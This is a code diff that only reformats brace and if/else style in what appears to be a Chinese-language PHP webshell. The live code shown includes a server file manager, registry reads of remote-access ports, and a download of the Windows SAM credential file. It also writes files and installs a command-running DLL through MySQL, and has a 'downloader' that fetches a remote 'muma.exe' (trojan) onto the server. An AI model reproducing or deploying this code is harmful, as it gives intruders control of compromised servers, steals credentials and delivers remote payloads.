-        while ($files = @$dir->read())
-        {
-            if ($files == '.' or $files == '..') continue;
+        while ($files = @$dir->read()) {
+            if ($files == '.' or $files == '..') {
+                continue;
+            }
             $filepath = str_path("$path/$files");
-            if (!is_dir($filepath))
-            {
+            if (!is_dir($filepath)) {
                 $fsize = @filesize($filepath);
                 $fsize = @File_Size(sprintf("%u", $fsize));
                 $perm = substr(base_convert(fileperms($filepath), 10, 8), -4);
@@ -2073,10 +2105,7 @@ end;
                     html_a("?type=1&unzip=" . $filepath, "Z解1", 'title="手写的PHP解压' . $files . "\" onClick=\"rusurechk('" . $todir . "','?tt=1&unzip=" . $filepath . '&todir=\');return false;"');
                     html_a("?type=2&unzip=" . $filepath, "Z解2", 'title="PHP自带的ZIP解压' . $files . "\" onClick=\"rusurechk('" . $todir . "','?tt=2&unzip=" . $filepath . '&todir=\');return false;"');
                     html_a("?type=3&unzip=" . $filepath, "T解", 'title="PHP自带的tar解压' . $files . ',针对LINUX文件属性权限用,比如0777,0755" onClick="rusurechk(\'' . $todir . "','?tt=3&unzip=" . $filepath . '&todir=\');return false;"');
-                }
-
-                else
-                {
+                } else {
                     html_a("?eanver=editr&p=" . $filepath, "编辑", "title=\"编辑" . $files . '"');
                 }
                 html_n("<a href=\"#\" onClick=\"rusurechk('" . $files . "','?eanver=rename&p=" . $filepath . "&newname=');return false;\">改名</a> <a href=\"#\" onClick=\"rusuredel('" . $files . "','?eanver=del&p=" . $filepath . "');return false;\">删除</a> <a href=\"#\" onClick=\"rusurechk('" . urldecode($filepath) . "','?eanver=copy&p=" . $filepath . "&newcopy=');return false;\">复制</a></td><td align=\"center\"><a href=\"javascript:SubmitAttran('修改所选文件属性为:','" . $files . "','" . $perm . "','c');\"  title='修改属性'>" . $perm . "</a></td><td align=\"center\">" . GetFileOwner("$path/$files") . ':' . GetFileGroup("$path/$files"));
@@ -2128,10 +2157,10 @@ end;
             $FILE_CODE = "";
             $charset = 'utf8';
             $FILE_TIME = date('Y-m-d H:i:s', time() + 3600 * 8);
-            if (@file_exists($p)) echo "发现目录下有\"同名\"文件,更换编码可以截入<br>";
-        }
-        else
-        {
+            if (@file_exists($p)) {
+                echo "发现目录下有\"同名\"文件,更换编码可以截入<br>";
+            }
+        } else {
             $jspath = urlencode($p);
             $FILE_TIME = date('Y-m-d H:i:s', filemtime($p));
             $FILE_CODE = file_get_contents($p);
@@ -2242,8 +2271,7 @@ end;
         $upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
         if ($dis_func == "") {
             $dis_func = "No";
-        } else
-        {
+        } else {
             $dis_func = str_replace(" ", "<br>", $dis_func);
             $dis_func = str_replace(",", "<br>", $dis_func);
         }
@@ -2258,15 +2286,14 @@ end;
         $Telnet = "";
         $PcAnywhere = "";
         $system = strtoupper(substr(PHP_OS, 0, 3));
-        if ($system == "WIN")
-        {
-            try
-            {
+        if ($system == "WIN") {
+            try {
                 $shell = new COM("WScript.Shell") or die("This thing requires Windows Scripting Host");
                 $registry_proxystring = $shell->RegRead("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber");
                 $Telnet = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\TelnetPort");
                 $PcAnywhere = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\pcAnywhere\\CurrentVersion\\System\\TCPIPDataPort");
-            }catch (Exception $e){}
+            } catch (Exception $e) {
+            }
         }
 
         echo "<tr><td width=\"40%\">Terminal Service端口为</td><td>" . $registry_proxystring . "</td></tr>" . "\n";
@@ -2443,7 +2470,11 @@ function sFull(i){
             $mpass = $_POST['mpass'];
             $mdata = $_POST['mdata'];
             $mport = $_POST['mport'];
-            if ($conn = @mysql_connect($mhost . ':' . $mport, $muser, $mpass)) @mysql_select_db($mdata); else $MSG_BOX = "连接MYSQL失败";
+            if ($conn = @mysql_connect($mhost . ':' . $mport, $muser, $mpass)) {
+                @mysql_select_db($mdata);
+            } else {
+                $MSG_BOX = "连接MYSQL失败";
+            }
         }
         $downfile = "c:/windows/repair/sam";
         if (!empty($_POST['downfile'])) {
@@ -2458,7 +2489,9 @@ function sFull(i){
                     $k++;
                 }
                 $filedown = basename($downfile);
-                if (!$filedown) $filedown = "envl.tmp";
+                if (!$filedown) {
+                    $filedown = "envl.tmp";
+                }
                 $array = explode('.', $filedown);
                 $arrayend = array_pop($array);
                 header("Content-type: application/x-" . $arrayend);
@@ -2466,7 +2499,9 @@ function sFull(i){
                 header("Content-Length: " . strlen($downcode));
                 echo $downcode;
                 exit;
-            } else $MSG_BOX = "下载文件失败";
+            } else {
+                $MSG_BOX = "下载文件失败";
+            }
         }
         $o = isset($_GET['o']) ? $_GET['o'] : '';
         html_n("<script language=\"javascript\">
@@ -2516,9 +2551,13 @@ function nFull(i){
                     if (@mysql_query($query, $conn)) {
                         $query = "SELECT cmd FROM a INTO DUMPFILE '" . $uppath . "';";
                         $MSG_BOX = @mysql_query($query, $conn) ? "上传文件成功" : "上传文件失败";
-                    } else $MSG_BOX = "插入临时表失败";
+                    } else {
+                        $MSG_BOX = "插入临时表失败";
+                    }
                     @mysql_query("Drop TABLE IF EXISTS a;", $conn);
-                } else $MSG_BOX = "创建临时表失败";
+                } else {
+                    $MSG_BOX = "创建临时表失败";
+                }
             }
             html_n("<br><br>上传路径 <input type=\"text\" name=\"uppath\" value=\"" . $uppath . "\" style=\"width:500px\">
 <br><br>选择文件 <input type=\"file\" name=\"upfile\" style=\"width:500px;height:22px;\">
@@ -2537,7 +2576,9 @@ function nFull(i){
                         $MSG_BOX .= $row[$k];
                         $k++;
                     }
-                } else $MSG_BOX .= "：" . @mysql_error();
+                } else {
+                    $MSG_BOX .= "：" . @mysql_error();
+                }
             }
             html_n("<textarea name=\"msql\" id=\"msql\" style=\"width:700px;height:200px;\">" . $msql . "</textarea></div>
 <div class=\"actall\">
@@ -2549,7 +2590,11 @@ function nFull(i){
 </select>
 <input type=\"button\" value=\"执行\" onclick=\"SubmitUrl();\" style=\"width:80px;\">");
         }
-        if ($MSG_BOX != '') echo "</div><div class=\"actall\">" . $MSG_BOX . "</div></center></form>"; else echo "</div></center></form>";
+        if ($MSG_BOX != '') {
+            echo "</div><div class=\"actall\">" . $MSG_BOX . "</div></center></form>";
+        } else {
+            echo "</div></center></form>";
+        }
         break;
     case "downloader":
         $Com_durl = isset($_POST['durl']) ? $_POST['durl'] : "http://" . getenv('REMOTE_ADDR') . "/down/muma.exe";
@@ -2561,7 +2606,11 @@ function nFull(i){
         if ((!empty($_POST['durl'])) && (!empty($_POST['dpath']))) {
             echo "<div class=\"actall\">";
             $contents = @implode('', @file($_POST['durl']));
-            if (!$contents) echo "无法读取要下载的数据"; else echo File_Write($_POST['dpath'], $contents, 'wb') ? "下载文件成功" : "下载文件失败";
+            if (!$contents) {
+                echo "无法读取要下载的数据";
+            } else {
+                echo File_Write($_POST['dpath'], $contents, 'wb') ? "下载文件成功" : "下载文件失败";
+            }
             echo "</div>";
         }
         break;
@@ -2636,7 +2685,11 @@ function delTank() {
         html_n("</td></tr></form>");
         if (!empty($_POST['path'])) {
             html_n("<tr><td>目标文件:<br><br>");
-            if (isset($_POST['pass'])) $bool = true; else $bool = false;
+            if (isset($_POST['pass'])) {
+                $bool = true;
+            } else {
+                $bool = false;
+            }
             do_passreturn($patht, $codet, $_POST['return'], $bool, $typet);
         }
         break;
@@ -2653,7 +2706,11 @@ function delTank() {
         html_n("</td></tr></form>");
         if (!empty($_POST['path'])) {
             html_n("<tr><td>目标文件:<br><br>");
-            if (isset($_POST['pass'])) $bool = true; else $bool = false;
+            if (isset($_POST['pass'])) {
+                $bool = true;
+            } else {
+                $bool = false;
+            }
             do_passreturn($_POST['path'], $_POST['newcode'], "tihuan", $bool, $_POST['oldcode']);
         }
         break;
@@ -2671,7 +2728,11 @@ function delTank() {
         html_n("</td></tr></form>");
         if (!empty($_POST['path'])) {
             html_n("<tr><td>找到文件:<br><br>");
-            if (isset($_POST['pass'])) $bool = true; else $bool = false;
+            if (isset($_POST['pass'])) {
+                $bool = true;
+            } else {
+                $bool = false;
+            }
             do_passreturn($_POST['path'], $_POST['code'], $_POST['return'], $bool);
         }
         break;
@@ -2684,7 +2745,11 @@ function delTank() {
         html_n("</td></tr></form>");
         if (!empty($_POST['path'])) {
             html_n("<tr><td>找到文件:<br><br>");
-            if (isset($_POST['pass'])) $bool = true; else $bool = false;
+            if (isset($_POST['pass'])) {
+                $bool = true;
+            } else {
+                $bool = false;
+            }
             do_passreturn($_POST['path'], $_POST['class'], "scanphp", $bool);
         }
         break;
@@ -2713,8 +2778,9 @@ function delTank() {
             $proxycontents = @implode('', @file($_POST['url']));
             $proxycontents2 = $proxycontents;
             $proxycontents = @TestUtf8($proxycontents) ? @iconv("utf-8", "utf8//IGNORE", $proxycontents) : $proxycontents;
-            if (empty($proxycontents))
+            if (empty($proxycontents)) {
                 $proxycontents = $proxycontents2;
+            }
             echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";
             exit;
         }
@@ -2738,7 +2804,9 @@ function delTank() {
         break;
     case "phpcode":
         $phpcode = isset($_POST['phpcode']) ? $_POST['phpcode'] : "phpinfo();";
-        if ($phpcode != "phpinfo();") $phpcode = htmlspecialchars(base64_decode($phpcode));
+        if ($phpcode != "phpinfo();") {
+            $phpcode = htmlspecialchars(base64_decode($phpcode));
+        }
         echo "<script language=\"javascript\">";
         html_base();
         echo "function SubmitUrl(){
@@ -2784,26 +2852,36 @@ function delTank() {
                                 $inpath = array_pop($ap);
                                 $query = "Create Function state returns string soname '" . $inpath . "';";
                                 $MSG_BOX = @mysql_query($query, $conn) ? "安装DLL成功" : "安装DLL失败";
-                            } else $MSG_BOX = "导出DLL文件失败";
-                        } else $MSG_BOX = "写入临时表失败";
+                            } else {
+                                $MSG_BOX = "导出DLL文件失败";
+                            }
+                        } else {
+                            $MSG_BOX = "写入临时表失败";
+                        }
                         @mysql_query("DROP TABLE Envl_Temp_Tab;", $conn);
-                    } else $MSG_BOX = "创建临时表失败";
+                    } else {
+                        $MSG_BOX = "创建临时表失败";
+                    }
                 }
                 if (!empty($_POST['runcmd'])) {
                     $query = "select state(\"" . $sqlcmd . "\");";
                     $result = @mysql_query($query, $conn);
                     if ($result) {
                         $k = 0;
-                        $info = NULL;
+                        $info = null;
                         while ($row = @mysql_fetch_array($result)) {
                             $infotmp .= $row[$k];
                             $k++;
                         }
                         $info = $infotmp;
                         $MSG_BOX = "执行成功";
-                    } else $MSG_BOX = "执行失败";
+                    } else {
+                        $MSG_BOX = "执行失败";
+                    }
                 }
-            } else $MSG_BOX = "连接MYSQL失败";
+            } else {
+                $MSG_BOX = "连接MYSQL失败";
+            }
         }
         html_n("<script language=\"javascript\">
 function Fullm(i){
@@ -2963,9 +3041,13 @@ function Createok(ac)
                 }
                 if (isset($_GET['table'])) {
                     $action .= '&table=' . $_GET['table'];
-                    if (isset($_GET['edit'])) $action .= '&edit=' . $_GET['edit'];
+                    if (isset($_GET['edit'])) {
+                        $action .= '&edit=' . $_GET['edit'];
+                    }
                 }
-                if (isset($_GET['insert'])) $action .= '&insert=' . $_GET['insert'];
+                if (isset($_GET['insert'])) {
+                    $action .= '&insert=' . $_GET['insert'];
+                }
                 echo "<div class=\"actall\"><form method=\"POST\" action=\"" . $action . "\" name=\"gform\" id=\"gform\">";
                 echo "<textarea name=\"nsql\" id=\"nsql\" style=\"width:500px;height:50px;\">" . $textarea . "</textarea> ";
                 echo "<input type=\"button\" name=\"querysql\" value=\"执行\" onclick=\"SubmitUrl();\" style=\"width:60px;height:49px;\"> <input type=\"button\" value=\"创建表\" style=\"width:60px;height:49px;\" onclick=\"Createok('a')\"> <input type=\"button\" value=\"创建库\" style=\"width:60px;height:49px;\" onclick=\"Createok('b')\"> <input type=\"button\" value=\"删除库\" style=\"width:60px;height:49px;\" onclick=\"Createok('c')\"></form></div><div class=\"msgbox\" style=\"height:40px;\">" . $MSG_BOX . "</div><div class=\"actall\"><a href=\"?eanver=mysql_msg&db=" . $_GET['db'] . '">' . $_GET['db'] . "</a> ---> ";
@@ -2973,7 +3055,11 @@ function Createok(ac)
                     echo "<a href=\"?eanver=mysql_msg&db=" . $_GET['db'] . '&table=' . $_GET['table'] . '">' . $_GET['table'] . '</a> ';
                     echo "[<a href=\"?eanver=mysql_msg&db=" . $_GET['db'] . '&insert=' . $_GET['table'] . "\">插入</a>]</div>";
                     if (isset($_GET['edit'])) {
-                        if (isset($_GET['p'])) $atable = $_GET['table'] . '&p=' . $_GET['p']; else $atable = $_GET['table'];
+                        if (isset($_GET['p'])) {
+                            $atable = $_GET['table'] . '&p=' . $_GET['p'];
+                        } else {
+                            $atable = $_GET['table'];
+                        }
                         echo "<form method=\"POST\" action=\"?eanver=mysql_msg&db=" . $_GET['db'] . '&table=' . $atable . '">';
                         $result = @mysql_query("SELECT * FROM " . $_GET['table'] . ' LIMIT ' . $_GET['edit'] . ', 1;', $conn);
                         $good = @mysql_fetch_assoc($result);
@@ -2996,16 +3082,19 @@ function Createok(ac)
                         $row_num = @mysql_num_rows(@mysql_query("SELECT * FROM " . $_GET['table'], $conn));
                         $numrows = $row_num;
                         $pages = intval($numrows / $pagesize);
-                        if ($numrows % $pagesize) $pages++;
+                        if ($numrows % $pagesize) {
+                            $pages++;
+                        }
                         if (!isset($_GET['p'])) {
                             $p = 0;
                             $_GET['p'] = 1;
                         } else {
                             $p2 = ((int)$_GET['p']);
-                            if ($p2 > $pages)
+                            if ($p2 > $pages) {
                                 $p2 = $pages;
-                            else if ($p2 < 1)
+                            } elseif ($p2 < 1) {
                                 $p2 = 1;
+                            }
                             $p = ($p2 - 1) * 20;
                             $_GET['p'] = $p2;
                         }
@@ -3021,10 +3110,11 @@ function Createok(ac)
                         }
                         echo "</tr>";
                         $nsql = isset($_POST['nsql']) ? $_POST['nsql'] : "";
-                        if (preg_match('/WHERE|LIMIT/', $nsql) && preg_match('/SELECT|FROM/', $nsql))
+                        if (preg_match('/WHERE|LIMIT/', $nsql) && preg_match('/SELECT|FROM/', $nsql)) {
                             $query = $nsql;
-                        else
+                        } else {
                             $query = "SELECT * FROM " . $_GET['table'] . ' LIMIT ' . $p . ', 20;';
+                        }
                         $result = @mysql_query($query, $conn);
                         $v = $p;
                         while ($text = @mysql_fetch_assoc($result)) {
@@ -3042,8 +3132,16 @@ function Createok(ac)
                         $pagenav = "";
                         $pageStr = $row_num > 0 ? $page : "0";
                         $charseta = isset($_GET['charset']) ? $_GET['charset'] : "";
-                        if ($pagep > 0) $pagenav .= "  <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=1&charset=" . $charseta . "'>首页</a> <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pagep . "&charset=" . $charseta . "'>上一页</a> "; else $pagenav .= " 上一页 ";
-                        if ($pagen <= $pages) $pagenav .= " <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pagen . "&charset=" . $charseta . "'>下一页</a> <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pages . "&charset=" . $charseta . "'>尾页</a>"; else $pagenav .= " 下一页 ";
+                        if ($pagep > 0) {
+                            $pagenav .= "  <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=1&charset=" . $charseta . "'>首页</a> <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pagep . "&charset=" . $charseta . "'>上一页</a> ";
+                        } else {
+                            $pagenav .= " 上一页 ";
+                        }
+                        if ($pagen <= $pages) {
+                            $pagenav .= " <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pagen . "&charset=" . $charseta . "'>下一页</a> <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pages . "&charset=" . $charseta . "'>尾页</a>";
+                        } else {
+                            $pagenav .= " 下一页 ";
+                        }
                         $pagenav .= " 第 [" . $pageStr . "/" . $pages . "] 页   跳到<input name='textfield' type='text' style='text-align:center;' size='4' value='" . $pageStr . "' onkeydown=\"if(event.keyCode==13)self.location.href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p='+this.value+'&charset=" . $charseta . "';\" />页";
                         echo $pagenav;
                         echo "</div>";
@@ -3097,4 +3195,3 @@ function Createok(ac)
 
 css_foot();
 ob_end_flush();
-?>
